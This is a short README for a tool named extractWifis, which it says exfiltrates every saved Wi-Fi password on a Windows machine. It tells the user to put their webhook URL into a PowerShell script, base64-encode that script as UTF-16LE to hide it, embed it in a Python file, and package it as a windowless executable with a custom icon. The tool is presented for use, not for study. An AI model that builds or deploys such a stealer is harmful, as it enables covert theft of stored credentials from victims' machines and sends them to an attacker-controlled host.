# extractWifis

Exfiltrate all Windows saved Wi-Fi passwords

## Requirements

1. On your Windows machine install Python https://www.python.org/downloads/
 
2. Install pyinstaller `C:\> pip install pyinstaller`


## Instructions

1. Open  `getwifis.ps1` and replace `WEBHOOK_URL_HERE` with your webhook url.

2. Encode Powershell (Linux command):
```bash
iconv -f ASCII -t UTF-16LE getwifis.ps1 | base64 -w0
```

3. Open `script.py` and replace `B64_HERE` with your base64 code.

4. Create executable
```cmd
c:\> pyinstaller --onefile --noconsole --icon=icon.ico script.py
```

Executable will be on `dist` folder
